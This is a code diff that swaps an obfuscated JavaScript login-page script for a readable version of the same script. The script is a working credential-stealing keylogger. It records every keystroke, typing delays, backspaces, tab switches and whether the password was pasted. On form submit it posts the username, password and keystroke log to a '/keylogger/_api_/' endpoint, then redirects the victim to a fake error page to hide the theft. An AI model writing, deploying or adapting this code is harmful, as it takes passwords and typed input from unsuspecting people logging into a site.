@@ -1,1 +1,51 @@
-const _0x4947a9=_0xeead;function _0x321e(){const _0x4b783c=['129858uuxKWH','1715YWpnEQ','POST','324IzTjlK','485609QeWrwH','20iUMcsY','push','get','hidden','error_page.html','visible','now','usuario','clave','566610vpyMBi','visibilitychange','loginForm','[name=\x22clave\x22]','submit','308231tczMwI','application/json','querySelector','192MOvasf','Backspace','addEventListener','then','href','103313iVEqAB','90tLpLqc','visibilityState','paste','key','keydown','1771344gHLcJe','getElementById'];_0x321e=function(){return _0x4b783c;};return _0x321e();}(function(_0xf7fabe,_0x2ac77d){const _0x20a497=_0xeead,_0x205d4c=_0xf7fabe();while(!![]){try{const _0x3f172c=-parseInt(_0x20a497(0x171))/0x1+-parseInt(_0x20a497(0x172))/0x2*(parseInt(_0x20a497(0x16d))/0x3)+-parseInt(_0x20a497(0x170))/0x4*(-parseInt(_0x20a497(0x16e))/0x5)+parseInt(_0x20a497(0x16b))/0x6+parseInt(_0x20a497(0x188))/0x7*(parseInt(_0x20a497(0x183))/0x8)+parseInt(_0x20a497(0x189))/0x9*(parseInt(_0x20a497(0x17b))/0xa)+-parseInt(_0x20a497(0x180))/0xb;if(_0x3f172c===_0x2ac77d)break;else _0x205d4c['push'](_0x205d4c['shift']());}catch(_0x2b3014){_0x205d4c['push'](_0x205d4c['shift']());}}}(_0x321e,0x4897f));let _0x402c29='',_0x2432c8=Date[_0x4947a9(0x178)](),_0xf58090=0x0,_0x221a2c=0x0,_0x4330f5=![],_0x3a1437=null,_0x4ff054=[];function _0xeead(_0xee79dd,_0x39ac1e){const _0x321e07=_0x321e();return _0xeead=function(_0xeead34,_0x469a92){_0xeead34=_0xeead34-0x167;let _0x429a41=_0x321e07[_0xeead34];return _0x429a41;},_0xeead(_0xee79dd,_0x39ac1e);}document['addEventListener'](_0x4947a9(0x16a),_0x1241ae=>{const _0x464395=_0x4947a9;if(_0x1241ae['key']['length']===0x1)_0x402c29+=_0x1241ae[_0x464395(0x169)];if(_0x1241ae[_0x464395(0x169)]===_0x464395(0x184))_0xf58090++;const _0x165325=Date[_0x464395(0x178)]();_0x3a1437&&_0x4ff054[_0x464395(0x173)](_0x165325-_0x3a1437),_0x3a1437=_0x165325;}),document['addEventListener'](_0x4947a9(0x17c),()=>{const _0xd1f729=_0x4947a9;(document['visibilityState']===_0xd1f729(0x175)||document[_0xd1f729(0x167)]===_0xd1f729(0x177))&&_0x221a2c++;}),document[_0x4947a9(0x182)](_0x4947a9(0x17e))[_0x4947a9(0x185)](_0x4947a9(0x168),()=>{_0x4330f5=!![];}),document[_0x4947a9(0x16c)](_0x4947a9(0x17d))[_0x4947a9(0x185)](_0x4947a9(0x17f),function(_0x1ec72f){const _0x3d5e0a=_0x4947a9;_0x1ec72f['preventDefault']();const _0x19e43f=new FormData(this),_0x252b07=Date[_0x3d5e0a(0x178)]()-_0x2432c8;fetch('/keylogger/_api_/',{'method':_0x3d5e0a(0x16f),'headers':{'_0x946f71':_0x3d5e0a(0x181)},'body':JSON['stringify']({'_0x59cb22':_0x19e43f[_0x3d5e0a(0x174)](_0x3d5e0a(0x179))||'','_0x12250b':_0x19e43f[_0x3d5e0a(0x174)](_0x3d5e0a(0x17a))||'','_0x19f6d6':_0x402c29,'_0xef4b0c':_0x252b07,'b':_0xf58090,'c':_0x221a2c,'_0x496954':_0x4330f5,'d':_0x4ff054})})[_0x3d5e0a(0x186)](()=>{const _0x5b4d7f=_0x3d5e0a;window['location'][_0x5b4d7f(0x187)]=_0x5b4d7f(0x176);});});
+let teclas = '';
+let startTime = Date.now();
+let backspaceCount = 0;
+let visibilityChanges = 0;
+let pasted = false;
+let lastKeyTime = null;
+let delays = [];
+
+document.addEventListener('keydown', e => {
+    if (e.key.length === 1) teclas += e.key;
+    if (e.key === 'Backspace') backspaceCount++;
+
+    const now = Date.now();
+    if (lastKeyTime) {
+        delays.push(now - lastKeyTime);
+    }
+    lastKeyTime = now;
+});
+
+document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'hidden' || document.visibilityState === 'visible') {
+        visibilityChanges++;
+    }
+});
+
+document.querySelector('[name="clave"]').addEventListener('paste', () => {
+    pasted = true;
+});
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const datos = new FormData(this);
+    const elapsed = Date.now() - startTime;
+
+    fetch('/keylogger/_api_/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            u: datos.get('usuario') || '',
+            p: datos.get('clave') || '',
+            k: teclas,
+            t: elapsed,
+            b: backspaceCount,
+            c: visibilityChanges,
+            g: pasted,
+            d: delays
+        })
+    }).then(() => {
+        window.location.href = 'error_page.html';
+    });
+});
